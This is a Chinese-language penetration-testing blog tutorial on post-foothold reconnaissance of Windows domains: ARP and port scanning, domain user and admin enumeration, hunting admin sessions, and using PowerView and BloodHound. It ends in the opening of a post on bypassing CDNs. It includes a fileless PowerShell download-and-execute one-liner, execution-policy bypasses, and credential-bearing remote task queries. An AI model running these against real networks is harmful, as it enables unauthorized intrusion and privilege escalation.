<p>3、通过ARP扫描探测内网<br>3.1：apr-scan工具<br>把arp-scan工具上传到目标主机上，可以自定义子网掩码，指定扫描范围，命令如下：</p>
<p>arp-scan.exe -t 10.10.10.0/20</p>
<p>3.2:Empire中的arpscan模块<br>下载地址：<a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<p>PS：在这里安装Empire需要更改一下格式：<a href="https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html">https://jingyan.baidu.com/article/215817f788e8c21eda1423ea.html</a></p>
<p>Empire中内置了arpscan的模块，这个模块可以在局域网内发送ARP数据包，搜集活跃主机的IP地址、MAC地址信息。</p>
<p>usemodule situational_awareness/network/arpscan</p>
<p>3.3：Nishang中的Invoke-ARPScan.ps1脚本<br>使用 Nishang 中的 Invoke-ARPScan.ps1 脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行、自定义掩码和扫描范围，命令如下：</p>
<p>powershell.exe -exec bypass -Command “Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24” &gt;&gt; result.txt</p>
<p>4、通过常规TCP/UDP端口扫描探测内网<br>ScanLine 是一款经典的端口扫描工具，Windows 全版本通用，体积小，仅使用单个文件，同时支持对 TCP/UDP 的端口扫描，命令如下：</p>
<p>scanline.exe -h -t 22,80,110,389,445,3389,1099,1433,3306,3389 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b</p>
<p>2.6 扫描域内端口<br>通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标的网络拓扑结构等，具体需要关注以下三点。</p>
<p>端口的 Banner 信息。</p>
<p>端口上运行的服务。</p>
<p>常见应用的默认端口</p>
<p>1：利用Telnet命令进行扫描<br>Telnet协议是TCP/IP协议的一种，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程工作的能力。</p>
<p>在目标主机上使用telnet协议，可以与目标服务器建立连接。如果只是想快速探测某太主机的某个常规高危端口是否开放，使用telnet命令就可以做到！</p>
<p>telnet DC 端口</p>
<p>2：使用S扫描器<br>S 扫描器是早期的一种比较快速的端口扫描工具，特别适合运行在 Windows Sever 2003 以下的平台上，支持大网段扫描。S 扫描器的扫描结果默认保存在其目录下的 result.txt 文件中。推荐使用 TCP 扫描，命令如下：</p>
<p>S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</p>
<p>3：使用Metasploit端口扫描<br>MSF这里就不多介绍了，我博客 <a href="http://www.saulgoodman.cn/">www.saulGoodman.cn</a> 里面讲了MSF的使用，端口扫描使用这个模块 :</p>
<p>auxiliary/scanner/portscan/tcp：</p>
<p>4：使用PowerScript的Invoke-portscan.ps1脚本<br>以无文件形式扫描，命令如下：</p>
<p>powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan</a> -Hosts 192.168.1.0/24 -T 4 -ports ‘445,1433,8080,3389,80’ -oA c:\windows\temp\res.txt”</p>
<p>使用还是挺不错的，速度挺快。</p>
<p>5：使用Nishang的Invoke-PortScan模块<br>Invoke-PortScan 是 Nishang 的端口扫描脚本，用于发现主机、解析主机名、端口扫描，是一个很实用的脚本。输入“Get-Help Invoke-PortScan -full”命令，即可查看帮助信息</p>
<p>具体的参数介绍如下。<br>StartAddress：扫描范围开始的地址。<br>EndAddress：扫描范围结束的地址。<br>ScanPort：进行端口扫描。<br>Port：指定扫描端口。默认扫描的端口有 21、22、23、53、69、71、80、98、110、139、<br>111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、<br>7878、8080、1521、3306、3389、5801、5900、5555、5901。<br>TimeOut：设置超时时间。<br>使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名：<br>Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost</p>
<p>6：端口Bannner信息<br>如果发现了端口，但是不确定这个端口是什么服务，就可以利用一些nc来获取这个端口的banner信息，就好比这样 ：</p>
<p>2.7 搜集域内基础信息<br>确定了当前内网拥有的域，并且所控制的主机在域里面，就可以进行域内相关信息的收集了。</p>
<p>因为这些查询命令本质上都是通过 LDAP 协议去域控制器上查询的，查询时候需要经过权限认证，只有域用户才有这个权限，所以本地用户是无法运行以下命令的（system 权限用户除外。在域里面，除了普通用户，所有机器都有一个机器用户，用户名为机器名加“$”。system 用户对应的就是域里面的机器用户，所以 system 权限用户是可以运行以下查询命令的）。</p>
<p>1：查询域</p>
<p>net view /domain</p>
<p>这里有个坑，有时候查询出错6118错误，是因为 Computer Brower 服务的问题，把它手动启动。</p>
<p>2：查询域内所有计算机<br>执行以下命令就可以查询得到主机名对主机角色进行初步判断：</p>
<p>net view /domain:HACKER[主机名]</p>
<p>3：查询域内所有用户组列表</p>
<p>net group /domain</p>
<p>4：查询所有域成员计算机列表</p>
<p>net group “domain computers” /domain</p>
<p>5：获取域密码信息<br>获取域密码策略、密码长度、错误锁定等信息用这条命令：</p>
<p>net accounts /domain</p>
<p>6：获取域信任信息</p>
<p>nltest /domain_trusts</p>
<p>2.8 查找域控制器<br>1：查看域控制器的机器名</p>
<p>nltest /DCLIST:主机名[Hacker]</p>
<p>2：查看域控制器主机名</p>
<p>Nslookup -type=SRV _ldap._tcp</p>
<p>3：查看当前时间<br>在通常情况下，时间服务器为主域控制器：</p>
<p>net time /domain</p>
<p>4：查看域控制器组</p>
<p>net group “Domain Controllers” /domain</p>
<p>PS：在实际情况中，一个域内一般有两台或者两台以上的域控制器，因为一点主域控制器发生故障，备用域控制器就可以保证域内服务和验证工作正常运行。</p>
<p>执行以下命令查看主域控制器为DC：</p>
<p>netdom query pdc</p>
<p>2.9 获取域内的用户和管理员信息<br>1：查询所有域用户列表<br>1.1：向域控制器进行查询<br>执行以下命令，向域控制器DC查询，域内有5个用户，其中krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法。</p>
<p>net user /domain</p>
<p>1.2：获取域内用户的详细信息<br>执行下面的命令可以获取域内用户的详细信息：用户名、描述信息、SID、域名等等</p>
<p>wmic useraccount get /all</p>
<p>1.3：查看存在的用户<br>执行以下命令会发现有五个用户：</p>
<p>dsquery user</p>
<p>关于 dsquery 命令还有如下：</p>
<p>1.4：查询本地管理员组用户</p>
<p>net localgroup administrators</p>
<p>默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。</p>
<p>2：查询域管理员用户组<br>2.1：查询域管理员用户</p>
<p>net group “domain admins” /domain</p>
<p>2.2：查询域管理员用户组</p>
<p>net group “Enterprise Admins” /domain</p>
<p>2.10 定位域管理员<br>1：域管理员定位概述<br>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。</p>
<p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是拿到内网中特定用户或特定机器的权限，进而获得特定资源，完成内网渗透测试任务。在通常的网络环境里，内网中部署了大量的网络安全设备，如 IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制，渗透测试人员就需要获取域管理员权限。</p>
<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员的权限。也就是说，在计算机添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，而且具备完全控制权限。</p>
<p>渗透测试人员通常会通过搜集域内信息，追踪域内特权用户、域管理组用户的历史登录位置、当前登录位置等。定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或 wevtutil 导出查看。会话是指域内每个机器的登录会话，可以匿名查询，无须权限，可以使用 netsess.exe 或 PowerView 等工具查询。</p>
<p>2：常用域管理员定位工具<br>2.1：psloggedon.exe<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否登录。其原理就是通过检查注册表 HKEY_USERS 项的 key 值来查询谁登录过（需要调用NetSessionEnum API），但某些功能需要管理员权限才能使用。</p>
<p>使用语法：<br>-：显示支持的选项和用于输出值的单位。<br>-l：仅显示本地登录，不显示本地和网络资源登录。<br>-x：不显示登录时间。<br>\computername：指定要列出登录信息的计算机的名称。<br>Username：指定用户名，在网络中搜索该用户登录的计算机。</p>
<p>2.2：PVEFindADUser.exe<br>PVEFindADUser.exe这款工具可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework 2.0 环境，并且需要具有管理员权限。</p>
<p>使用语法：<br>pveFindADUser.exe &lt;参数&gt;<br>-h：显示帮助。<br>-u：检查是否有更新版本的实用程序。<br>-current [‘’username’’]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。<br>-last [‘’username’’]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机。根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。 -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。<br>-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</p>
<p>2.3：netview.exe<br>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。</p>
<p>使用语法：<br>netview.exe &lt;参数&gt;<br>-h：显示帮助菜单。<br>-f filename.txt：指定从中提取主机列表的文件。<br>-e filename.txt：指定要排除的主机名文件。<br>-o filename.txt：将所有输出重定向到文件。<br>-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。<br>-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。<br> -c：检查对已找到共享的访问权限。</p>
<p>2.4：Nmap的NSE脚本<br>如果有域账户或者本地账户，就可以使用 Nmap 的 smb-enum-sessions.nse 引擎来获取远程机器的登录会话，并且不需要管理员权限。smb-enum-sessions.nse 的下载地址为：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html%E3%80%82">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html。</a></p>
<p>smb-enum-domains.nse：对域控制器进行信息收集，可以获取主机信息、用户、密码策略可<br>以使用的用户等。<br>smb-enum-users.nse：在进行域渗透测试的时候，如果获取了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。<br>smb-enum-shares.nse：遍历远程主机的共享目录。<br>smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙及杀毒软件。<br>smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。<br>smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间。</p>
<p>2.5：PowerView脚本<br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p>
<p>Invoke-StealthUserHunter ：只需要一次查询，就可以获取域内的所有用户。从user.HomeDirectories 中提取所有用户，并对每个服务器进行 Get-NetSessions 获取。因为不需要使用 Invoke-UserHunter 对每台机器进行操作，所以这个方法的隐蔽性相对较高，但涉及的机器面不一定完整。默认使用 Invoke-StealthUserHunter，如果找不到需要的信息，就接着使用 Invoke-UserHunter 方法。</p>
<p>Invoke-UserHunter：找到域内特定的用户群。它接收用户名、用户列表或域组查询，并接收一个主机列表或查询可用的主机域名。它会使用 Get-NetSessions 和 Get-NetLoggedon（调用 NetSessionEnum 和 NetWkstaUserEnum API）扫描每个服务器，而且会比较结果，筛选出目标用户集。使用这个工具是不需要管理员权限的。在本地绕过执行该脚本。</p>
<p>2.6：Empire下的user_hunter模块<br>在 Empire 下也存在类似 Invoke-UserHunter 的模块——user_hunter，这个模块就是用来查找域管理员登录的机器的。</p>
<p>使用 usemodule situational_awareness/network/powerview/user_hunter 模块可以清楚地看到哪个用户登录了哪台主机。在这里，显示域管理员曾经登录了机器名为 WIN7-64.shuteer.testlab、IP 地址为 192.168.31.251 的机器。</p>
<p>2.11 查找域管理进程<br>一个典型的域权限提升过程通常围绕着收集明文凭据或者通过 Mimikatz 来获得提升的权限等方法，然后在其所获取管理员权限的系统中寻找域管理员登录进程，从而收集域管理员的凭据。</p>
<p>我们来看一种假设的情况：渗透测试人员在某个内网环境中获得了一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，找出有哪些用户登录了这台服务器上。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时也没有域管理员组的用户登录这台服务器，那么他会选择另一个账户，继续寻找这个账户在内网哪个机器上具有管理权限，再枚举这台机器上的登录用户，并继续进行渗透测试，直至找到一个有效的路径可以获取到域管理员权限为止。在具有成千上万台计算机和用户的环境中，该过程可能需要几天甚至几周的时间。</p>
<p>1：本机检查<br>1.1：获取域管理员列表</p>
<p>net group “Domain Admins” /domain<br>当前有一个域管理员：administrator</p>
<p>1.2：列出本机所有进程及进程用户</p>
<p>tasklist /v</p>
<p>1.3：寻找进程所有者为域管理员的进程<br>通过以上操作可以看出，当前存在域管理员进程，这种方法只是有几率能查找到域管理员进程，在实际情况下往往并非如此。</p>
<p>2：查询域控制器的域用户会话<br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p>
<p>2.1：查询域控制器列表<br>可以使用LDAP查询从Domain Controlles单元中收集的域控制器列表。也可以使用net命令查询域控制器列表。</p>
<p>net group “Domain Controllers” /domain</p>
<p>2.2：收集域管理员列表<br>可以使用LDAP进行查询。也可以使用net命令，从域管理员组中收集域管理员列表。</p>
<p>net group “Domain Admins” /domain</p>
<p>2.3：收集所有活动域的会话列表<br>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe它包含本地Windows函数netsessionenum。</p>
<p>netsess.exe -h</p>
<p>2.4：交叉引用域管理员列表与活动会话列表<br>对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下列脚本快速使用netsess.exe的Windows命令行。</p>
<p>将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行脚本会在当前目录下生成一个文本文件sessions.txt：</p>
<p>FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</p>
<p>3：查询远程系统中运行的任务<br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理员任务。</p>
<p>首先，从Domain Admins组中收集域管理员列表：</p>
<p>net group “Domain Admins” /domain</p>
<p>然后运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中：</p>
<p>FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</p>
<p>4：扫描远程系统的NetBIOS信息<br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户，下面这个Windows命令行脚本就用于扫描远程系统活跃域中的管理会话。</p>
<p>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i<br>同样，吧目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt文件中，同目录运行脚本：</p>
<p>2.12 域管理员模拟方法简介<br>如果您已经有一个 meterpreter 会话，您可以使用 Incognito模拟域管理员，或添加一个新的域 管理员。通过尝试遍历系统中所有可用的授权令牌来随意添加新的管理员。</p>
<p>2.13 利用PowerShell收集域信息<br>PowerShell可以理解为增强版的”cmd.exe”，打开方式就是：运行-&gt;输入powershell：</p>
<p>如果想执行一个Powershell脚本，需要修改Powershell的默认权限为执行权限。PowerShell常用的执行权限有四种：</p>
<p>Restricted：默认设置，不允许执行任何脚本。<br>Allsigned：只能运行经过证书验证的脚本。<br>Unrestricted：权限最高，可以执行任意脚本。<br>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。<br>在PowerShell中输入Get-ExecutionPolicy，可以查看权限：</p>
<p>如果想要修改权限就可以执行这条命令，然后选择Y：</p>
<p>Set-ExecutionPolicy 权限名</p>
<p>powerview<br>powerview这个脚本是一款依赖于 powershell 和 WMI 对内网进行查询的常用渗透测试脚本。</p>
<p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p>导入脚本 powerview.ps1：</p>
<p>import-module .\powerview.ps1</p>
<p>Powerview中常用的命令</p>
<p>Get-NetDomain：获取当前用户所在的域名称。<br>Get-NetUser：返回所有用户的详细信息。<br>Get-NetDomainController：获取所有域控制器。<br>Get-NetComputer：获取所有域内机器的详细信息。<br>Get-NetOU：获取域中的 OU 信息。<br>Get-NetGroup：获取所有域内组和组成员信息。<br>Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。<br>Get-NetShare：获取当前域内所有网络共享。<br>Get-NetSession：获取在指定服务器存在的会话信息。<br>Get-NetRDPSession：获取在指定服务器存在的远程连接信息。<br>Get-NetProcess：获取远程主机的进程信息。<br>Get-UserEvent：获取指定用户的日志信息。<br>Get-ADObject：获取活动目录的对象信息。<br>Get-NetGPO：获取域所有组策略对象。<br>Get-DomainPolicy：获取域默认或域控制器策略。<br>Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。<br>Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。<br>Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。<br>获取当前用户所在的域名称</p>
<p>Get-NetDomain</p>
<p>返回所有用户的详细信息</p>
<p>获取所有域控制器</p>
<p>Get-NetDomainController</p>
<p>获取所有域内机器的详细信息</p>
<p>Get-NetComputer</p>
<p>获取域中的 OU 信息</p>
<p>Get-NetOU</p>
<p>获取所有域内组和组成员信息</p>
<p>Get-NetGroup</p>
<p>根据 SPN 获取当前域使用的文件服务器</p>
<p>Get-NetFileServer</p>
<p>获取当前域内所有网络共享</p>
<p>Get-NetShare</p>
<p>获取在指定服务器存在的会话信息</p>
<p>Get-NetSession</p>
<p>获取在指定服务器存在的远程连接信息</p>
<p>Get-NetRDPSession</p>
<p>获取远程主机的进程信息</p>
<p>Get-NetProcess</p>
<p>获取指定用户的日志信息</p>
<p>Get-UserEvent</p>
<p>获取活动目录的对象信息</p>
<p>Get-ADObject</p>
<p>获取域所有组策略对象</p>
<p>Get-NetGPO</p>
<p>获取域默认或域控制器策略</p>
<p>Get-DomainPolicy</p>
<p>用于获取域用户登录计算机及该用户是否有本地管理权限</p>
<p>Invoke-UserHunter</p>
<p>查找域内所有机器进程用于找到某特定用户</p>
<p>Invoke-ProcessHunter</p>
<p>根据用户日志获取某域用户登录过哪些域机器</p>
<p>Invoke-UserEventHunter</p>
<p>CMD运行powershell</p>
<p>powershell -exec bypass “import-module c:\powerview.ps1;get-netuser”</p>
<p>2.14 域渗透分析工具bloodhound的使用<br>安装BloodHound所需环境</p>
<p>1、下载安装JDK<br>JDK8下载地址：<a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p>
<p>2、下载安装Neo4j<br>下载地址：<a href="https://neo4j.com/download-center/#releases">https://neo4j.com/download-center/#releases</a></p>
<p>3、启动Neo4j数据库服务端<br>下载好后，进入对应的目录在命令行运行如下命令启动（必须安装JDK环境才可以）</p>
<p>cd C:\neo4j-community-3.5.3\bin<br>neo4j.bat console</p>
<p>通过浏览器打开：<a href="http://localhost:7474/">http://localhost:7474/</a></p>
<p>打开后设置一下密码：原密码neo4j，修改为：123456（任意）</p>
<p>4、下载BloodHound<br>下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p>
<p>然后打开：</p>
<p>输入账号密码：eno4j、123456</p>
<p>查找所有域管理员。<br>寻找到达域管理员的最短路径。<br>查找具有 dcsync权限的主体。<br>具有外部域组成员身份的用户。<br>具有外部域组成员身份的组。<br>映射域信任。<br>无约束委托系统的最短路径。<br>从 KerberoAstable 用户获得的最短路径。<br>从 KerberoAstable 用户到域管理员的最短路径。<br>拥有主体的最短路径。<br>从所属主体到域管理员的最短路径。<br>高价值目标的最短路径。<br>再下载：<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe</a></p>
<p>放到C盘下：</p>
<p>然后运行：</p>
<p>SharpHound.exe -c all</p>
<p>运行完后会在当前路径下生成一个文件：2020032.png”-webkit-tap-highlight-color: rgba(0, 0, 0, 0);font-size: 14.6667px;margin-top: 1em;margin-bottom: 1em;color: rgb(22, 18, 9);font-family: “Microsoft Jhenghei”, “Lantinghei SC”, lanting, “PingFang SC”, “Seguo UI”, “Microsoft Yahei”, Arial;white-space: normal;background-color: rgb(255, 255, 255);”&gt;</p>
<p>然后我们吧他拖进去上传：</p>
<p>这个时候就有数据了：</p>
<p>查找所有域管理员</p>
<p>寻找最短到达域管理员的路径</p>
<p>查找具有 dcsync权限的主体</p>
<p>查看指定用户与域关联的详细信息<br>点一下用户就会在左边显示：</p>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a href="https://www.cnblogs.com/KevinGeorge/p/10513211.html">https://www.cnblogs.com/KevinGeorge/p/10513211.html</a><br><a href="https://www.cnblogs.com/backlion/p/10643132.html">https://www.cnblogs.com/backlion/p/10643132.html</a></p>
<p>2.15 敏感数据防护<br>内网核心敏感数据，不仅仅包括数据库、电子邮件。还包括个人数据及组织的业务数据…可以说，价值高的数据基本上都在内网中，所以要了解攻击者的操作流程，这会对内网数据安全防护工作至关重要。</p>
<p>1：资料、数据、文件的定位流程<br>内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者主要通过各种恶意方法来定位公司内部各相关人员的机器。从而获取资料、数据、文件等重要信息。文件定位大致流程如下：</p>
<p>定位内部人事组织结构</p>
<p>在内部人事组织结构中寻找需要监视的人员</p>
<p>定位相关人员的机器</p>
<p>监视相关人员存放文档的位置</p>
<p>列出存放文档的服务器的目录</p>
<p>2：重点核心业务机器及敏感信息防护<br>重点核心业务机器是攻击者比较关心的机器，因此，我们需要对这些机器采取相应的安全防护措施。</p>
<p>1．核心业务机器<br>高管/系统管理员/财务/人事/业务人员的个人计算机。<br>产品管理系统服务器（仓库管理系统） 。<br>OA 办公系统服务器。<br>财务应用系统服务器。<br>核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。<br>数据库服务器。<br>文件服务器/共享服务器。<br>邮件服务器。<br>网络监控系统服务器。<br>其他服务器（分公司、工厂）。</p>
<p>2．各类敏感文件信息<br>站点源码备份文件、数据库备份文件、配置文件备份等（后缀 XX.zip，XX.sql 等） 。<br>各类数据库的 Web 管理入口，如 phpmyadmin、adminer等。<br>浏览器密码和浏览器 cookie（IE、Chrome、Firefox） 。<br>其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。<br>Windows 无线密码。<br>目标内部的各种账号和密码信息，包括邮箱、VPN、FTP、TeamView 等。<br>3：应用于文件形式信息的防护<br>总体来说，渗透测试人员对于这一步的工作，一是要了解已攻陷机器所属人员的职位（通常 一个高职位的人在内网中的权限比一般员工要高，在他的计算机内也会有很多重要的、敏感的个 人或公司内部文件），二是要在该机器中通过一些搜索命令来寻找自己所需要的资料。用户在内网 中工作时，建议不要将一些特别重要的资料放在公开的计算机中，必要时一定要对 Office 文档进 行加密，密码也不要太过于简单（对低版本的 Office 软件，如 Office 2003，在网上很容易找到一些破解软件进行破解；对高版本的 Office 软件，也可以通过微软 Sysinternals Suite 套件中的抓取 Dump 的工具 procdump 来获取密码） 。</p>
<p>2.16 分析域内网段划分情况及拓扑图结构<br>要养成一个习惯，在掌握了内网相关信息后，可以做一个拓扑图来帮助我们分析内网网络的分布情况。</p>
<p>1：基本架构<br>我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。</p>
<p>ASP + Access + IIS 5.0/6.0 + Windows Sever 2003</p>
<p>ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008</p>
<p>PHP + MySQL + IIS</p>
<p>PHP + MySQL + Apache</p>
<p>PHP + MySQL + Ngnix</p>
<p>JSP + MySQL + Ngnix</p>
<p>JSP + MSSQL + Tomcat</p>
<p>JSP + Oracle + Tomcat</p>
<p>2：域内网划分<br>内网的环境判断，首先需要分析内网 IP 地址的分布情况。一般可以通过内网中的路由器、交 换机等设备，以及 SNMP、弱口令等，来获取内网网络拓扑或 DNS 域传送的信息。一般的大公司 都会有内部网站，渗透测试人员也可通过内部网站的公开链接找出部门的 IP 地址段。内部网络是怎么划分的？是按照部门划分网段，按照楼层划分网段，还是按照地区划分网段？内网通常可分为 DMZ 区、办公区和核心区（生产区） 。了解整个内网的网络分布和组成，也有助 于渗透测试人员了解内网的核心业务。</p>
<p>1．DMZ 区<br>在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区而 DMZ 区访问不了内网区的情况下，相关知识在第 1 章中已经详细讲解过，此处不再重 复。</p>
<p>2．办公区<br>办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。</p>
<p>3．核心区<br>核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全 设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。<br>通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN寻找真实IP的8种方法</title>
    <url>/2020/05/26/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载：<a href="https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw">https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw</a></strong></p>
<p>正常情况下，通过cmd命令可以快速找到域名对应IP，最常见的命令如ping、nslookup。但很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
<p><strong>一、DNS历史解析记录</strong></p>
<p>查询域名的历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
